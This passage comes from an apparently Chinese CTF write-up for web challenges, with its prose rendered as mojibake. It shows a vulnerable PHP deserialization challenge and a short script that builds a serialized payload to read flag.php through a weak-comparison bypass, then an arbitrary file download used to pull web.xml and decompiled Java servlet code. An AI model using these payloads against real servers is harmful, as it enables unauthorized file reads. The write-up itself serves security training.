class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();       </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½ä¸Šæœ‰ä¸€ä¸ªä»»æ„å†™è·Ÿä»»æ„è¯»ã€‚åªéœ€è¦è¿‡ä¸€ä¸ªvalidå‡½æ•°æ£€æŸ¥å°±èƒ½ååºåˆ—åŒ–ã€‚opçš„å€¼å†³å®šäº†è¯»/å†™åŠŸèƒ½ã€‚</p><p>é¦–å…ˆææ„å‡½æ•°æ˜æ˜¾æ˜¯å…¥æ‰‹ç‚¹ã€‚ä½†æ˜¯ä»–é™åˆ¶äº†å½“opä¸º<code>&quot;2&quot;</code>æ—¶ä»¤opä¸º<code>&quot;1&quot;</code>ä¹Ÿå°±æ˜¯å†™åŠŸèƒ½ã€‚ç„¶ååˆç½®å†…å®¹ä¸ºç©ºã€‚<br>è·Ÿè¿›åˆ°<code>process()</code>å‡½æ•°çœ‹ä¸‹,ä¼šæ˜æ˜¾çš„å‘ç°å®ƒé‡‡ç”¨äº†<code>$this-&gt;op == &quot;2&quot;</code>è¿™æ ·çš„å¼±ç±»å‹ç›¸ç­‰åˆ¤æ–­ã€‚<br>é‚£ä¹ˆæ¼æ´å¾ˆæ˜æ˜¾äº†,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡ææ„å‡½æ•°çš„é™åˆ¶,è¾¾æˆä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p>ä¸è¿‡æ³¨æ„çš„æ˜¯,åŸé¢˜çš„<code>Filehandler</code>ç±»å±æ€§éƒ½æ˜¯protected,è¡¨ç°å‡ºæ¥çš„ç»“æœå°±æ˜¯åºåˆ—åŒ–æ•°æ®æœ‰ç©ºå­—ç¬¦ã€‚è€Œè¿™æ˜¯è¿‡ä¸äº†<code>is_valid()</code>çš„æ£€æŸ¥çš„</p><p>ä½†æ˜¯ä¸è¦ç´§ã€‚php7.2+ç‰ˆæœ¬ä¸‹ååºåˆ—åŒ–å¹¶ä¸åœ¨ä¹ä½ ä¼ å…¥çš„æ•°æ®å±æ€§æ˜¯å¦æ˜¯protectedã€‚æ‰€ä»¥æˆ‘ä»¬æ”¹æˆpublicå³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">"file:///web/html/flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($o));</span><br></pre></td></tr></table></figure><p><code>2==&quot;2&quot;,&quot;2e0&quot;==&quot;2&quot;</code>è¿™ç§æŠ€å·§ä¸ç”¨å¤šè¯´äº†ã€‚è¿™é‡Œè¦è§£é‡Šçš„æ˜¯æ¯”è¾ƒå‘çš„åé¢çš„filenameã€‚å¼€å§‹ç›´æ¥ä¼ªåè®®è¯»flag.phpè¯»ä¸åˆ°ã€‚è¿™ä¸ªä»æºç è§’åº¦è®²å®Œå…¨æ²¡é“ç†ã€‚<br>ç„¶ååªèƒ½å°è¯•ç”¨ç»å¯¹è·¯å¾„è¯»äº†ã€‚åŸºäºæˆ‘ä»¬å…¶ä»–æ–‡ä»¶éƒ½èƒ½è½»æ¾è¯»åˆ°,æˆ‘ä»¬å…ˆæ„é€ ä¸ª404çœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆæœåŠ¡å™¨ã€‚<br>å‘ç°æ˜¯ Alpineçš„é•œåƒã€‚<br>äºæ˜¯æŸ¥äº†æ³¢å…¶webè·¯å¾„çš„é…ç½®/web/config/httpd.conf<br><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/1.png" class="lazyload" data-srcset="1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç„¶åå¾—åˆ°webè·¯å¾„åæ¢ç»å¯¹è·¯å¾„å°±è¯»åˆ°äº†ï¼Œç„å­¦é—®é¢˜ã€‚<br><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/2.png" class="lazyload" data-srcset="2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>psï¼š<br>èµ›åçªç„¶æƒ³èµ·æ¥åŸæ¥åœ¨åšD^3æ—¶è¸©è¿‡çš„ä¸€ä¸ªå‘ã€‚å°±æ˜¯apacheçš„ææ„å‡½æ•°æ‰§è¡Œæ—¶å·¥ä½œç›®å½•å¯èƒ½ä¼šå˜ã€‚æ‰€ä»¥ç”¨ç›¸å¯¹è·¯å¾„è¯»æ—¶æ˜¯è·å–ä¸åˆ°flag.phpçš„.å½“ç„¶è¿™æ˜¯æ¦‚ç‡é—®é¢˜ã€æœ‰çš„äººå°±èƒ½ç›´æ¥è¯»åˆ°ã€‚</p><h1 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h1><p>è¿™é¢˜èƒ½å‡º200è§£æˆ‘æ˜¯çœŸæ²¡æƒ³åˆ°çš„,ä¸»è¦ä¸­é—´é‚£æ³¢å‚ç›´ä¸Šåˆ†å¤ªçªå…€äº†ã€‚ä½†ä»”ç»†æƒ³æˆ‘ä¹Ÿæ˜¯é‚£ä¸ªæ—¶é—´äº¤çš„flagâ€¦</p><p>å½“ç„¶é¢˜ç›®è‚¯å®šæ˜¯ç®€å•é¢˜ã€‚é¦–å…ˆè¿›å»æœ‰ä¸€ä¸ªæˆ‘å¼€å§‹å¿½ç•¥çš„ä¿¡æ¯å°±æ˜¯å®ƒåœ¨uploadç•Œé¢æç¤ºflagåœ¨/flagã€ç„¶åéšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶,é©¬ä¸Šå°±æµ‹å‡ºæ˜¯ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½</p><p>é‚£è€å¥—è·¯å…ˆä»<code>/WEB-INF/web.xml</code>å¼€å§‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"2.5"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>file_in_java<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>upload.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªServlet,è·¯å¾„ä¹Ÿéƒ½ç»™å‡ºæ¥äº†ï¼Œä¸€ä¸ªä¸ªè¯»ç„¶ååç¼–è¯‘å§ã€‚</p><p>è¿™é‡Œç›´æ¥ç»™å‡ºå«æœ‰å…³é”®ä»£ç çš„java<br>UploadServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://www.geocities.com/kpdus/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) </span></span><br><span class="line"><span class="comment">// Source File Name:   UploadServlet.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileUploadException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UploadServlet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String savePath;</span><br><span class="line">        File tempFile;</span><br><span class="line">        String message;</span><br><span class="line">        savePath = getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">        String tempPath = getServletContext().getRealPath(<span class="string">"/WEB-INF/temp"</span>);</span><br><span class="line">        tempFile = <span class="keyword">new</span> File(tempPath);</span><br><span class="line">        <span class="keyword">if</span>(!tempFile.exists())</span><br><span class="line">            tempFile.mkdir();</span><br><span class="line">        message = <span class="string">""</span>;</span><br><span class="line">        ServletFileUpload upload;</span><br><span class="line">        DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">        factory.setSizeThreshold(<span class="number">0x19000</span>);</span><br><span class="line">        factory.setRepository(tempFile);</span><br><span class="line">        upload = <span class="keyword">new</span> ServletFileUpload(factory);</span><br><span class="line">        upload.setProgressListener(<span class="keyword">new</span>  Object()     <span class="comment">/* anonymous class not found */</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_anm1</span> </span>&#123;&#125;</span><br><span class="line">);</span><br><span class="line">        upload.setHeaderEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">        upload.setFileSizeMax(<span class="number">0x100000L</span>);</span><br><span class="line">        upload.setSizeMax(<span class="number">0xa00000L</span>);</span><br><span class="line">        <span class="keyword">if</span>(!ServletFileUpload.isMultipartContent(request))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            List list = upload.parseRequest(request);</span><br><span class="line">            Iterator iterator = list.iterator();</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!iterator.hasNext())</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                FileItem fileItem = (FileItem)iterator.next();</span><br><span class="line">                <span class="keyword">if</span>(fileItem.isFormField())</span><br><span class="line">                &#123;</span><br><span class="line">                    String name = fileItem.getFieldName();</span><br><span class="line">                    String s = fileItem.getString(<span class="string">"UTF-8"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    String filename = fileItem.getName();</span><br><span class="line">                    <span class="keyword">if</span>(filename != <span class="keyword">null</span> &amp;&amp; !filename.trim().equals(<span class="string">""</span>))</span><br><span class="line">                    &#123;</span><br><span class="line">                        String fileExtName = filename.substring(filename.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">                        InputStream in = fileItem.getInputStream();</span><br><span class="line">                        <span class="keyword">if</span>(filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName))</span><br><span class="line">                            <span class="keyword">try</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                                Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">catch</span>(InvalidFormatException e)</span><br><span class="line">                            &#123;</span><br><span class="line">                                System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        String saveFilename = makeFileName(filename);</span><br><span class="line">                        request.setAttribute(<span class="string">"saveFilename"</span>, saveFilename);</span><br><span class="line">                        request.setAttribute(<span class="string">"filename"</span>, filename);</span><br><span class="line">                        String realSavePath = makePath(saveFilename, savePath);</span><br><span class="line">                        FileOutputStream out = <span class="keyword">new</span> FileOutputStream((<span class="keyword">new</span> StringBuilder()).append(realSavePath).append(<span class="string">"/"</span>).append(saveFilename).toString());</span><br><span class="line">                        <span class="keyword">byte</span> buffer[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">0</span>; (len = in.read(buffer)) &gt; <span class="number">0</span>;)</span><br><span class="line">                            out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line"></span><br><span class="line">                        in.close();</span><br><span class="line">                        out.close();</span><br><span class="line">                        message = <span class="string">"\u6587\u4EF6\u4E0A\u4F20\u6210\u529F!"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span>(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(FileUploadException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        request.setAttribute(<span class="string">"message"</span>, message);</span><br><span class="line">        request.getRequestDispatcher(<span 